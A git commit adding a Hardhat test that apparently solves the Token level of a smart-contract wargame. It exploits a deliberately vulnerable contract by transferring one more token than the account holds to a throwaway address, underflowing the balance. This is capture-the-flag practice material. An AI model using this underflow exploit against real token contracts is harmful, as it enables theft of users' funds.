613d01961c4f489346f83ba5cc66f0f138e8bfba
Sean Seefried <sean@seefried.com.au>
2022-03-20 20:23:07 +1000

    Add solution to level 5

---
+++ test/5-token.ts
@@ -0,0 +1,35 @@
+import { expect } from "chai";
+import { Contract, Signer, BigNumber } from "ethers";
+import { ethers } from "hardhat";
+import { createChallenge, submitLevel } from "./utils";
+
+let accounts: Signer[];
+let eoa: Signer;
+let attacker: Contract;
+let challenge: Contract; // challenge contract
+let tx: any;
+
+before(async () => {
+  accounts = await ethers.getSigners();
+  [eoa] = accounts;
+  const challengeFactory = await ethers.getContractFactory(`Token`);
+  const challengeAddress = await createChallenge(
+    `0x63bE8347A617476CA461649897238A31835a32CE`
+  );
+  challenge = await challengeFactory.attach(challengeAddress);
+
+  // const attackerFactory = await ethers.getContractFactory(`TelephoneAttacker`);
+  // attacker = await attackerFactory.deploy(challenge.address);
+});
+
+it("solves the challenge", async function () {
+  let cheatAddr: string = `0xdeadbeef00000000000000000000000000000001`
+  let addr: string = await eoa.getAddress();
+  let balance: BigNumber = await challenge.balanceOf(addr);
+  await challenge.transfer(cheatAddr, balance.add(BigNumber.from(1n)));
+  console.log("balance after transfer: ", await challenge.balanceOf(addr));
+});
+
+after(async () => {
+  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
+});
